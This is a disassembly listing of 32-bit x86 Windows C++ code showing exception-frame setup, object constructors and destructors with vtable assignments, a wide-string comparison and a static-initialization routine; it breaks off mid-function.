  403e68:	c2 04 00             	ret    $0x4
  403e6b:	cc                   	int3
  403e6c:	cc                   	int3
  403e6d:	cc                   	int3
  403e6e:	cc                   	int3
  403e6f:	cc                   	int3
  403e70:	55                   	push   %ebp
  403e71:	8b ec                	mov    %esp,%ebp
  403e73:	56                   	push   %esi
  403e74:	8b 75 08             	mov    0x8(%ebp),%esi
  403e77:	8b d1                	mov    %ecx,%edx
  403e79:	8b 46 04             	mov    0x4(%esi),%eax
  403e7c:	33 42 04             	xor    0x4(%edx),%eax
  403e7f:	a8 01                	test   $0x1,%al
  403e81:	75 76                	jne    0x403ef9
  403e83:	8b 42 08             	mov    0x8(%edx),%eax
  403e86:	3b 46 08             	cmp    0x8(%esi),%eax
  403e89:	75 6e                	jne    0x403ef9
  403e8b:	8b 42 0c             	mov    0xc(%edx),%eax
  403e8e:	3b 46 0c             	cmp    0xc(%esi),%eax
  403e91:	75 66                	jne    0x403ef9
  403e93:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  403e96:	85 c9                	test   %ecx,%ecx
  403e98:	75 0d                	jne    0x403ea7
  403e9a:	39 4e 34             	cmp    %ecx,0x34(%esi)
  403e9d:	b9 c0 57 43 00       	mov    $0x4357c0,%ecx
  403ea2:	74 03                	je     0x403ea7
  403ea4:	8b 4e 2c             	mov    0x2c(%esi),%ecx
  403ea7:	8b 42 1c             	mov    0x1c(%edx),%eax
  403eaa:	85 c0                	test   %eax,%eax
  403eac:	75 12                	jne    0x403ec0
  403eae:	39 42 34             	cmp    %eax,0x34(%edx)
  403eb1:	b8 c0 57 43 00       	mov    $0x4357c0,%eax
  403eb6:	74 08                	je     0x403ec0
  403eb8:	8b 42 2c             	mov    0x2c(%edx),%eax
  403ebb:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  403ec0:	66 8b 10             	mov    (%eax),%dx
  403ec3:	66 3b 11             	cmp    (%ecx),%dx
  403ec6:	75 1e                	jne    0x403ee6
  403ec8:	66 85 d2             	test   %dx,%dx
  403ecb:	74 15                	je     0x403ee2
  403ecd:	66 8b 50 02          	mov    0x2(%eax),%dx
  403ed1:	66 3b 51 02          	cmp    0x2(%ecx),%dx
  403ed5:	75 0f                	jne    0x403ee6
  403ed7:	83 c0 04             	add    $0x4,%eax
  403eda:	83 c1 04             	add    $0x4,%ecx
  403edd:	66 85 d2             	test   %dx,%dx
  403ee0:	75 de                	jne    0x403ec0
  403ee2:	33 c0                	xor    %eax,%eax
  403ee4:	eb 05                	jmp    0x403eeb
  403ee6:	1b c0                	sbb    %eax,%eax
  403ee8:	83 c8 01             	or     $0x1,%eax
  403eeb:	85 c0                	test   %eax,%eax
  403eed:	75 0a                	jne    0x403ef9
  403eef:	b8 01 00 00 00       	mov    $0x1,%eax
  403ef4:	5e                   	pop    %esi
  403ef5:	5d                   	pop    %ebp
  403ef6:	c2 04 00             	ret    $0x4
  403ef9:	33 c0                	xor    %eax,%eax
  403efb:	5e                   	pop    %esi
  403efc:	5d                   	pop    %ebp
  403efd:	c2 04 00             	ret    $0x4
  403f00:	33 c0                	xor    %eax,%eax
  403f02:	c2 04 00             	ret    $0x4
  403f05:	cc                   	int3
  403f06:	cc                   	int3
  403f07:	cc                   	int3
  403f08:	cc                   	int3
  403f09:	cc                   	int3
  403f0a:	cc                   	int3
  403f0b:	cc                   	int3
  403f0c:	cc                   	int3
  403f0d:	cc                   	int3
  403f0e:	cc                   	int3
  403f0f:	cc                   	int3
  403f10:	8b 01                	mov    (%ecx),%eax
  403f12:	ff 60 60             	jmp    *0x60(%eax)
  403f15:	cc                   	int3
  403f16:	cc                   	int3
  403f17:	cc                   	int3
  403f18:	cc                   	int3
  403f19:	cc                   	int3
  403f1a:	cc                   	int3
  403f1b:	cc                   	int3
  403f1c:	cc                   	int3
  403f1d:	cc                   	int3
  403f1e:	cc                   	int3
  403f1f:	cc                   	int3
  403f20:	33 c0                	xor    %eax,%eax
  403f22:	c3                   	ret
  403f23:	cc                   	int3
  403f24:	cc                   	int3
  403f25:	cc                   	int3
  403f26:	cc                   	int3
  403f27:	cc                   	int3
  403f28:	cc                   	int3
  403f29:	cc                   	int3
  403f2a:	cc                   	int3
  403f2b:	cc                   	int3
  403f2c:	cc                   	int3
  403f2d:	cc                   	int3
  403f2e:	cc                   	int3
  403f2f:	cc                   	int3
  403f30:	55                   	push   %ebp
  403f31:	8b ec                	mov    %esp,%ebp
  403f33:	6a ff                	push   $0xffffffff
  403f35:	68 6f f5 42 00       	push   $0x42f56f
  403f3a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403f40:	50                   	push   %eax
  403f41:	51                   	push   %ecx
  403f42:	a1 0c 40 44 00       	mov    0x44400c,%eax
  403f47:	33 c5                	xor    %ebp,%eax
  403f49:	50                   	push   %eax
  403f4a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403f4d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403f53:	8b d1                	mov    %ecx,%edx
  403f55:	89 55 f0             	mov    %edx,-0x10(%ebp)
  403f58:	c7 02 74 5d 43 00    	movl   $0x435d74,(%edx)
  403f5e:	c7 42 04 00 00 00 00 	movl   $0x0,0x4(%edx)
  403f65:	c7 42 08 00 00 00 00 	movl   $0x0,0x8(%edx)
  403f6c:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403f73:	c7 02 88 63 43 00    	movl   $0x436388,(%edx)
  403f79:	c7 42 0c 00 00 00 00 	movl   $0x0,0xc(%edx)
  403f80:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  403f87:	8d 4a 10             	lea    0x10(%edx),%ecx
  403f8a:	c7 02 1c 63 43 00    	movl   $0x43631c,(%edx)
  403f90:	e8 ab e7 ff ff       	call   0x402740
  403f95:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  403f99:	c7 42 3c 01 00 00 00 	movl   $0x1,0x3c(%edx)
  403fa0:	c7 42 40 00 00 00 00 	movl   $0x0,0x40(%edx)
  403fa7:	c7 42 44 00 00 00 00 	movl   $0x0,0x44(%edx)
  403fae:	c7 42 48 00 00 00 00 	movl   $0x0,0x48(%edx)
  403fb5:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  403fb9:	c7 42 4c 01 00 00 00 	movl   $0x1,0x4c(%edx)
  403fc0:	c7 42 50 00 00 00 00 	movl   $0x0,0x50(%edx)
  403fc7:	c7 42 54 00 00 00 00 	movl   $0x0,0x54(%edx)
  403fce:	c7 42 58 00 00 00 00 	movl   $0x0,0x58(%edx)
  403fd5:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  403fd9:	c7 42 5c 01 00 00 00 	movl   $0x1,0x5c(%edx)
  403fe0:	c7 42 60 00 00 00 00 	movl   $0x0,0x60(%edx)
  403fe7:	c7 42 64 00 00 00 00 	movl   $0x0,0x64(%edx)
  403fee:	c7 42 68 00 00 00 00 	movl   $0x0,0x68(%edx)
  403ff5:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  403ff9:	c7 42 6c 01 00 00 00 	movl   $0x1,0x6c(%edx)
  404000:	c7 42 70 00 00 00 00 	movl   $0x0,0x70(%edx)
  404007:	c7 42 74 00 00 00 00 	movl   $0x0,0x74(%edx)
  40400e:	c7 42 78 00 00 00 00 	movl   $0x0,0x78(%edx)
  404015:	c6 45 fc 06          	movb   $0x6,-0x4(%ebp)
  404019:	c7 42 7c 01 00 00 00 	movl   $0x1,0x7c(%edx)
  404020:	c7 82 80 00 00 00 00 	movl   $0x0,0x80(%edx)
  404027:	00 00 00 
  40402a:	c7 82 84 00 00 00 00 	movl   $0x0,0x84(%edx)
  404031:	00 00 00 
  404034:	c7 82 88 00 00 00 00 	movl   $0x0,0x88(%edx)
  40403b:	00 00 00 
  40403e:	c6 45 fc 07          	movb   $0x7,-0x4(%ebp)
  404042:	c7 82 8c 00 00 00 01 	movl   $0x1,0x8c(%edx)
  404049:	00 00 00 
  40404c:	c7 82 90 00 00 00 00 	movl   $0x0,0x90(%edx)
  404053:	00 00 00 
  404056:	c7 82 94 00 00 00 00 	movl   $0x0,0x94(%edx)
  40405d:	00 00 00 
  404060:	c7 82 98 00 00 00 00 	movl   $0x0,0x98(%edx)
  404067:	00 00 00 
  40406a:	c6 45 fc 08          	movb   $0x8,-0x4(%ebp)
  40406e:	c7 82 9c 00 00 00 01 	movl   $0x1,0x9c(%edx)
  404075:	00 00 00 
  404078:	c7 82 a0 00 00 00 00 	movl   $0x0,0xa0(%edx)
  40407f:	00 00 00 
  404082:	c7 82 a4 00 00 00 00 	movl   $0x0,0xa4(%edx)
  404089:	00 00 00 
  40408c:	c7 82 a8 00 00 00 00 	movl   $0x0,0xa8(%edx)
  404093:	00 00 00 
  404096:	c6 45 fc 09          	movb   $0x9,-0x4(%ebp)
  40409a:	c7 82 ac 00 00 00 01 	movl   $0x1,0xac(%edx)
  4040a1:	00 00 00 
  4040a4:	c7 82 b0 00 00 00 00 	movl   $0x0,0xb0(%edx)
  4040ab:	00 00 00 
  4040ae:	c7 82 b4 00 00 00 00 	movl   $0x0,0xb4(%edx)
  4040b5:	00 00 00 
  4040b8:	c7 82 b8 00 00 00 00 	movl   $0x0,0xb8(%edx)
  4040bf:	00 00 00 
  4040c2:	c6 45 fc 0a          	movb   $0xa,-0x4(%ebp)
  4040c6:	c7 82 bc 00 00 00 01 	movl   $0x1,0xbc(%edx)
  4040cd:	00 00 00 
  4040d0:	c7 82 c0 00 00 00 00 	movl   $0x0,0xc0(%edx)
  4040d7:	00 00 00 
  4040da:	c7 82 c4 00 00 00 00 	movl   $0x0,0xc4(%edx)
  4040e1:	00 00 00 
  4040e4:	c7 82 c8 00 00 00 00 	movl   $0x0,0xc8(%edx)
  4040eb:	00 00 00 
  4040ee:	c6 45 fc 0b          	movb   $0xb,-0x4(%ebp)
  4040f2:	c7 82 cc 00 00 00 01 	movl   $0x1,0xcc(%edx)
  4040f9:	00 00 00 
  4040fc:	c7 82 d0 00 00 00 00 	movl   $0x0,0xd0(%edx)
  404103:	00 00 00 
  404106:	c7 82 d4 00 00 00 00 	movl   $0x0,0xd4(%edx)
  40410d:	00 00 00 
  404110:	c7 82 d8 00 00 00 00 	movl   $0x0,0xd8(%edx)
  404117:	00 00 00 
  40411a:	c6 45 fc 0c          	movb   $0xc,-0x4(%ebp)
  40411e:	c7 82 dc 00 00 00 01 	movl   $0x1,0xdc(%edx)
  404125:	00 00 00 
  404128:	c7 82 e0 00 00 00 00 	movl   $0x0,0xe0(%edx)
  40412f:	00 00 00 
  404132:	c7 82 e4 00 00 00 00 	movl   $0x0,0xe4(%edx)
  404139:	00 00 00 
  40413c:	c7 82 e8 00 00 00 00 	movl   $0x0,0xe8(%edx)
  404143:	00 00 00 
  404146:	c6 45 fc 0d          	movb   $0xd,-0x4(%ebp)
  40414a:	c7 82 ec 00 00 00 01 	movl   $0x1,0xec(%edx)
  404151:	00 00 00 
  404154:	c7 82 f0 00 00 00 00 	movl   $0x0,0xf0(%edx)
  40415b:	00 00 00 
  40415e:	c7 82 f4 00 00 00 00 	movl   $0x0,0xf4(%edx)
  404165:	00 00 00 
  404168:	c7 82 f8 00 00 00 00 	movl   $0x0,0xf8(%edx)
  40416f:	00 00 00 
  404172:	c6 45 fc 0e          	movb   $0xe,-0x4(%ebp)
  404176:	c7 82 fc 00 00 00 01 	movl   $0x1,0xfc(%edx)
  40417d:	00 00 00 
  404180:	c7 82 00 01 00 00 00 	movl   $0x0,0x100(%edx)
  404187:	00 00 00 
  40418a:	c7 82 04 01 00 00 00 	movl   $0x0,0x104(%edx)
  404191:	00 00 00 
  404194:	c7 82 08 01 00 00 00 	movl   $0x0,0x108(%edx)
  40419b:	00 00 00 
  40419e:	c6 45 fc 0f          	movb   $0xf,-0x4(%ebp)
  4041a2:	c7 82 0c 01 00 00 01 	movl   $0x1,0x10c(%edx)
  4041a9:	00 00 00 
  4041ac:	c7 82 10 01 00 00 00 	movl   $0x0,0x110(%edx)
  4041b3:	00 00 00 
  4041b6:	c7 82 14 01 00 00 00 	movl   $0x0,0x114(%edx)
  4041bd:	00 00 00 
  4041c0:	c7 82 18 01 00 00 00 	movl   $0x0,0x118(%edx)
  4041c7:	00 00 00 
  4041ca:	c6 45 fc 10          	movb   $0x10,-0x4(%ebp)
  4041ce:	c7 82 1c 01 00 00 01 	movl   $0x1,0x11c(%edx)
  4041d5:	00 00 00 
  4041d8:	c7 82 20 01 00 00 00 	movl   $0x0,0x120(%edx)
  4041df:	00 00 00 
  4041e2:	c7 82 24 01 00 00 00 	movl   $0x0,0x124(%edx)
  4041e9:	00 00 00 
  4041ec:	c7 82 28 01 00 00 00 	movl   $0x0,0x128(%edx)
  4041f3:	00 00 00 
  4041f6:	c6 45 fc 11          	movb   $0x11,-0x4(%ebp)
  4041fa:	c7 82 2c 01 00 00 01 	movl   $0x1,0x12c(%edx)
  404201:	00 00 00 
  404204:	c7 82 30 01 00 00 00 	movl   $0x0,0x130(%edx)
  40420b:	00 00 00 
  40420e:	c7 82 34 01 00 00 00 	movl   $0x0,0x134(%edx)
  404215:	00 00 00 
  404218:	c7 82 38 01 00 00 00 	movl   $0x0,0x138(%edx)
  40421f:	00 00 00 
  404222:	c6 45 fc 12          	movb   $0x12,-0x4(%ebp)
  404226:	c7 82 3c 01 00 00 01 	movl   $0x1,0x13c(%edx)
  40422d:	00 00 00 
  404230:	c7 82 40 01 00 00 00 	movl   $0x0,0x140(%edx)
  404237:	00 00 00 
  40423a:	c7 82 44 01 00 00 00 	movl   $0x0,0x144(%edx)
  404241:	00 00 00 
  404244:	c7 82 48 01 00 00 00 	movl   $0x0,0x148(%edx)
  40424b:	00 00 00 
  40424e:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  404255:	8b c2                	mov    %edx,%eax
  404257:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40425a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404261:	59                   	pop    %ecx
  404262:	8b e5                	mov    %ebp,%esp
  404264:	5d                   	pop    %ebp
  404265:	c3                   	ret
  404266:	cc                   	int3
  404267:	cc                   	int3
  404268:	cc                   	int3
  404269:	cc                   	int3
  40426a:	cc                   	int3
  40426b:	cc                   	int3
  40426c:	cc                   	int3
  40426d:	cc                   	int3
  40426e:	cc                   	int3
  40426f:	cc                   	int3
  404270:	55                   	push   %ebp
  404271:	8b ec                	mov    %esp,%ebp
  404273:	6a ff                	push   $0xffffffff
  404275:	68 8f f6 42 00       	push   $0x42f68f
  40427a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404280:	50                   	push   %eax
  404281:	51                   	push   %ecx
  404282:	56                   	push   %esi
  404283:	a1 0c 40 44 00       	mov    0x44400c,%eax
  404288:	33 c5                	xor    %ebp,%eax
  40428a:	50                   	push   %eax
  40428b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40428e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404294:	8b f1                	mov    %ecx,%esi
  404296:	89 75 f0             	mov    %esi,-0x10(%ebp)
  404299:	c7 45 fc 11 00 00 00 	movl   $0x11,-0x4(%ebp)
  4042a0:	8b 8e 44 01 00 00    	mov    0x144(%esi),%ecx
  4042a6:	85 c9                	test   %ecx,%ecx
  4042a8:	74 05                	je     0x4042af
  4042aa:	8b 01                	mov    (%ecx),%eax
  4042ac:	ff 50 20             	call   *0x20(%eax)
  4042af:	c6 45 fc 10          	movb   $0x10,-0x4(%ebp)
  4042b3:	8b 8e 34 01 00 00    	mov    0x134(%esi),%ecx
  4042b9:	85 c9                	test   %ecx,%ecx
  4042bb:	74 05                	je     0x4042c2
  4042bd:	8b 01                	mov    (%ecx),%eax
  4042bf:	ff 50 20             	call   *0x20(%eax)
  4042c2:	c6 45 fc 0f          	movb   $0xf,-0x4(%ebp)
  4042c6:	8b 8e 24 01 00 00    	mov    0x124(%esi),%ecx
  4042cc:	85 c9                	test   %ecx,%ecx
  4042ce:	74 05                	je     0x4042d5
  4042d0:	8b 01                	mov    (%ecx),%eax
  4042d2:	ff 50 20             	call   *0x20(%eax)
  4042d5:	c6 45 fc 0e          	movb   $0xe,-0x4(%ebp)
  4042d9:	8b 8e 14 01 00 00    	mov    0x114(%esi),%ecx
  4042df:	85 c9                	test   %ecx,%ecx
  4042e1:	74 05                	je     0x4042e8
  4042e3:	8b 01                	mov    (%ecx),%eax
  4042e5:	ff 50 20             	call   *0x20(%eax)
  4042e8:	c6 45 fc 0d          	movb   $0xd,-0x4(%ebp)
  4042ec:	8b 8e 04 01 00 00    	mov    0x104(%esi),%ecx
  4042f2:	85 c9                	test   %ecx,%ecx
  4042f4:	74 05                	je     0x4042fb
  4042f6:	8b 01                	mov    (%ecx),%eax
  4042f8:	ff 50 20             	call   *0x20(%eax)
  4042fb:	c6 45 fc 0c          	movb   $0xc,-0x4(%ebp)
  4042ff:	8b 8e f4 00 00 00    	mov    0xf4(%esi),%ecx
  404305:	85 c9                	test   %ecx,%ecx
  404307:	74 05                	je     0x40430e
  404309:	8b 01                	mov    (%ecx),%eax
  40430b:	ff 50 20             	call   *0x20(%eax)
  40430e:	c6 45 fc 0b          	movb   $0xb,-0x4(%ebp)
  404312:	8b 8e e4 00 00 00    	mov    0xe4(%esi),%ecx
  404318:	85 c9                	test   %ecx,%ecx
  40431a:	74 05                	je     0x404321
  40431c:	8b 01                	mov    (%ecx),%eax
  40431e:	ff 50 20             	call   *0x20(%eax)
  404321:	c6 45 fc 0a          	movb   $0xa,-0x4(%ebp)
  404325:	8b 8e d4 00 00 00    	mov    0xd4(%esi),%ecx
  40432b:	85 c9                	test   %ecx,%ecx
  40432d:	74 05                	je     0x404334
  40432f:	8b 01                	mov    (%ecx),%eax
  404331:	ff 50 20             	call   *0x20(%eax)
  404334:	c6 45 fc 09          	movb   $0x9,-0x4(%ebp)
  404338:	8b 8e c4 00 00 00    	mov    0xc4(%esi),%ecx
  40433e:	85 c9                	test   %ecx,%ecx
  404340:	74 05                	je     0x404347
  404342:	8b 01                	mov    (%ecx),%eax
  404344:	ff 50 20             	call   *0x20(%eax)
  404347:	c6 45 fc 08          	movb   $0x8,-0x4(%ebp)
  40434b:	8b 8e b4 00 00 00    	mov    0xb4(%esi),%ecx
  404351:	85 c9                	test   %ecx,%ecx
  404353:	74 05                	je     0x40435a
  404355:	8b 01                	mov    (%ecx),%eax
  404357:	ff 50 20             	call   *0x20(%eax)
  40435a:	c6 45 fc 07          	movb   $0x7,-0x4(%ebp)
  40435e:	8b 8e a4 00 00 00    	mov    0xa4(%esi),%ecx
  404364:	85 c9                	test   %ecx,%ecx
  404366:	74 05                	je     0x40436d
  404368:	8b 01                	mov    (%ecx),%eax
  40436a:	ff 50 20             	call   *0x20(%eax)
  40436d:	c6 45 fc 06          	movb   $0x6,-0x4(%ebp)
  404371:	8b 8e 94 00 00 00    	mov    0x94(%esi),%ecx
  404377:	85 c9                	test   %ecx,%ecx
  404379:	74 05                	je     0x404380
  40437b:	8b 01                	mov    (%ecx),%eax
  40437d:	ff 50 20             	call   *0x20(%eax)
  404380:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  404384:	8b 8e 84 00 00 00    	mov    0x84(%esi),%ecx
  40438a:	85 c9                	test   %ecx,%ecx
  40438c:	74 05                	je     0x404393
  40438e:	8b 01                	mov    (%ecx),%eax
  404390:	ff 50 20             	call   *0x20(%eax)
  404393:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  404397:	8b 4e 74             	mov    0x74(%esi),%ecx
  40439a:	85 c9                	test   %ecx,%ecx
  40439c:	74 05                	je     0x4043a3
  40439e:	8b 01                	mov    (%ecx),%eax
  4043a0:	ff 50 20             	call   *0x20(%eax)
  4043a3:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  4043a7:	8b 4e 64             	mov    0x64(%esi),%ecx
  4043aa:	85 c9                	test   %ecx,%ecx
  4043ac:	74 05                	je     0x4043b3
  4043ae:	8b 01                	mov    (%ecx),%eax
  4043b0:	ff 50 20             	call   *0x20(%eax)
  4043b3:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  4043b7:	8b 4e 54             	mov    0x54(%esi),%ecx
  4043ba:	85 c9                	test   %ecx,%ecx
  4043bc:	74 05                	je     0x4043c3
  4043be:	8b 01                	mov    (%ecx),%eax
  4043c0:	ff 50 20             	call   *0x20(%eax)
  4043c3:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  4043c7:	8b 4e 44             	mov    0x44(%esi),%ecx
  4043ca:	85 c9                	test   %ecx,%ecx
  4043cc:	74 05                	je     0x4043d3
  4043ce:	8b 01                	mov    (%ecx),%eax
  4043d0:	ff 50 20             	call   *0x20(%eax)
  4043d3:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  4043d7:	8d 4e 10             	lea    0x10(%esi),%ecx
  4043da:	e8 41 d8 ff ff       	call   0x401c20
  4043df:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4043e6:	c7 06 88 63 43 00    	movl   $0x436388,(%esi)
  4043ec:	c7 45 fc 13 00 00 00 	movl   $0x13,-0x4(%ebp)
  4043f3:	8b 4e 0c             	mov    0xc(%esi),%ecx
  4043f6:	85 c9                	test   %ecx,%ecx
  4043f8:	74 05                	je     0x4043ff
  4043fa:	8b 01                	mov    (%ecx),%eax
  4043fc:	ff 50 20             	call   *0x20(%eax)
  4043ff:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  404406:	c7 06 74 5d 43 00    	movl   $0x435d74,(%esi)
  40440c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40440f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404416:	59                   	pop    %ecx
  404417:	5e                   	pop    %esi
  404418:	8b e5                	mov    %ebp,%esp
  40441a:	5d                   	pop    %ebp
  40441b:	c3                   	ret
  40441c:	cc                   	int3
  40441d:	cc                   	int3
  40441e:	cc                   	int3
  40441f:	cc                   	int3
  404420:	55                   	push   %ebp
  404421:	8b ec                	mov    %esp,%ebp
  404423:	56                   	push   %esi
  404424:	8b f1                	mov    %ecx,%esi
  404426:	e8 45 fe ff ff       	call   0x404270
  40442b:	8b 45 08             	mov    0x8(%ebp),%eax
  40442e:	a8 01                	test   $0x1,%al
  404430:	74 20                	je     0x404452
  404432:	a8 04                	test   $0x4,%al
  404434:	75 0e                	jne    0x404444
  404436:	8b ce                	mov    %esi,%ecx
  404438:	e8 13 71 01 00       	call   0x41b550
  40443d:	8b c6                	mov    %esi,%eax
  40443f:	5e                   	pop    %esi
  404440:	5d                   	pop    %ebp
  404441:	c2 04 00             	ret    $0x4
  404444:	68 4c 01 00 00       	push   $0x14c
  404449:	56                   	push   %esi
  40444a:	e8 31 d2 ff ff       	call   0x401680
  40444f:	83 c4 08             	add    $0x8,%esp
  404452:	8b c6                	mov    %esi,%eax
  404454:	5e                   	pop    %esi
  404455:	5d                   	pop    %ebp
  404456:	c2 04 00             	ret    $0x4
  404459:	cc                   	int3
  40445a:	cc                   	int3
  40445b:	cc                   	int3
  40445c:	cc                   	int3
  40445d:	cc                   	int3
  40445e:	cc                   	int3
  40445f:	cc                   	int3
  404460:	55                   	push   %ebp
  404461:	8b ec                	mov    %esp,%ebp
  404463:	6a ff                	push   $0xffffffff
  404465:	68 c1 f6 42 00       	push   $0x42f6c1
  40446a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404470:	50                   	push   %eax
  404471:	a1 0c 40 44 00       	mov    0x44400c,%eax
  404476:	33 c5                	xor    %ebp,%eax
  404478:	50                   	push   %eax
  404479:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40447c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404482:	64 a1 2c 00 00 00    	mov    %fs:0x2c,%eax
  404488:	8b 08                	mov    (%eax),%ecx
  40448a:	a1 8c 66 44 00       	mov    0x44668c,%eax
  40448f:	3b 81 04 00 00 00    	cmp    0x4(%ecx),%eax
  404495:	7f 14                	jg     0x4044ab
  404497:	b8 7c 66 44 00       	mov    $0x44667c,%eax
  40449c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40449f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4044a6:	59                   	pop    %ecx
  4044a7:	8b e5                	mov    %ebp,%esp
  4044a9:	5d                   	pop    %ebp
  4044aa:	c3                   	ret
  4044ab:	68 8c 66 44 00       	push   $0x44668c
  4044b0:	e8 3f 97 02 00       	call   0x42dbf4
  4044b5:	83 c4 04             	add    $0x4,%esp
  4044b8:	83 3d 8c 66 44 00 ff 	cmpl   $0xffffffff,0x44668c
  4044bf:	75 d6                	jne    0x404497
  4044c1:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4044c8:	b9 80 66 44 00       	mov    $0x446680,%ecx
  4044cd:	68 b8 5f 43 00       	push   $0x435fb8
  4044d2:	c7 05 7c 66 44 00 50 	movl   $0x404550,0x44667c
  4044d9:	45 40 00 
  4044dc:	e8 4f e7 ff ff       	call   0x402c30
  4044e1:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4044e8:	68 8c 66 44 00       	push   $0x44668c
  4044ed:	e8 b8 96 02 00       	call   0x42dbaa
  4044f2:	83 c4 04             	add    $0x4,%esp
  4044f5:	eb a0                	jmp    0x404497
  4044f7:	cc                   	int3
  4044f8:	cc                   	int3
  4044f9:	cc                   	int3
  4044fa:	cc                   	int3
  4044fb:	cc                   	int3
  4044fc:	cc                   	int3
  4044fd:	cc                   	int3
  4044fe:	cc                   	int3
  4044ff:	cc                   	int3
  404500:	55                   	push   %ebp
  404501:	8b ec                	mov    %esp,%ebp
  404503:	56                   	push   %esi
  404504:	57                   	push   %edi
  404505:	8b f9                	mov    %ecx,%edi
  404507:	e8 54 ff ff ff       	call   0x404460
  40450c:	8b 75 08             	mov    0x8(%ebp),%esi
  40450f:	3b f0                	cmp    %eax,%esi
  404511:	74 32                	je     0x404545
  404513:	8b 48 0c             	mov    0xc(%eax),%ecx
  404516:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  404519:	75 1c                	jne    0x404537
  40451b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40451e:	39 48 08             	cmp    %ecx,0x8(%eax)
  404521:	75 14                	jne    0x404537
  404523:	51                   	push   %ecx
  404524:	ff 76 04             	push   0x4(%esi)
  404527:	ff 70 04             	push   0x4(%eax)
  40452a:	ff 15 c4 54 43 00    	call   *0x4354c4
  404530:	83 c4 0c             	add    $0xc,%esp
  404533:	85 c0                	test   %eax,%eax
  404535:	74 0e                	je     0x404545
  404537:	56                   	push   %esi
  404538:	8b cf                	mov    %edi,%ecx
  40453a:	e8 81 f5 ff ff       	call   0x403ac0
  40453f:	5f                   	pop    %edi
  404540:	5e                   	pop    %esi
  404541:	5d                   	pop    %ebp
  404542:	c2 04 00             	ret    $0x4
  404545:	5f                   	pop    %edi
  404546:	b8 01 00 00 00       	mov    $0x1,%eax
  40454b:	5e                   	pop    %esi
  40454c:	5d                   	pop    %ebp
  40454d:	c2 04 00             	ret    $0x4
  404550:	55                   	push   %ebp
  404551:	8b ec                	mov    %esp,%ebp
  404553:	6a ff                	push   $0xffffffff
  404555:	68 f5 f6 42 00       	push   $0x42f6f5
  40455a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404560:	50                   	push   %eax
  404561:	51                   	push   %ecx
  404562:	56                   	push   %esi
  404563:	a1 0c 40 44 00       	mov    0x44400c,%eax
  404568:	33 c5                	xor    %ebp,%eax
  40456a:	50                   	push   %eax
  40456b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40456e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404574:	81 3d c8 69 44 00 54 	cmpl   $0x154,0x4469c8
  40457b:	01 00 00 
  40457e:	7c 2c                	jl     0x4045ac
  404580:	68 cc 69 44 00       	push   $0x4469cc
  404585:	e8 76 97 01 00       	call   0x41dd00
  40458a:	8b 35 c4 69 44 00    	mov    0x4469c4,%esi
  404590:	83 c4 04             	add    $0x4,%esp
  404593:	85 f6                	test   %esi,%esi
  404595:	74 07                	je     0x40459e
  404597:	8b 06                	mov    (%esi),%eax
  404599:	a3 c4 69 44 00       	mov    %eax,0x4469c4
  40459e:	c7 05 cc 69 44 00 01 	movl   $0x1,0x4469cc
  4045a5:	00 00 00 
  4045a8:	85 f6                	test   %esi,%esi
  4045aa:	75 22                	jne    0x4045ce
  4045ac:	68 54 01 00 00       	push   $0x154
  4045b1:	6a 00                	push   $0x0
  4045b3:	ff 15 d8 51 43 00    	call   *0x4351d8
  4045b9:	50                   	push   %eax
  4045ba:	ff 15 e8 51 43 00    	call   *0x4351e8
  4045c0:	8b f0                	mov    %eax,%esi
  4045c2:	85 f6                	test   %esi,%esi
  4045c4:	75 08                	jne    0x4045ce
  4045c6:	6a ff                	push   $0xffffffff
  4045c8:	ff 15 4c 54 43 00    	call   *0x43544c
  4045ce:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4045d1:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4045d8:	8b ce                	mov    %esi,%ecx
  4045da:	e8 51 f9 ff ff       	call   0x403f30
  4045df:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  4045e3:	c7 06 a4 62 43 00    	movl   $0x4362a4,(%esi)
  4045e9:	c7 86 4c 01 00 00 00 	movl   $0x0,0x14c(%esi)
  4045f0:	00 00 00 
  4045f3:	c7 86 50 01 00 00 00 	movl   $0x0,0x150(%esi)
  4045fa:	00 00 00 
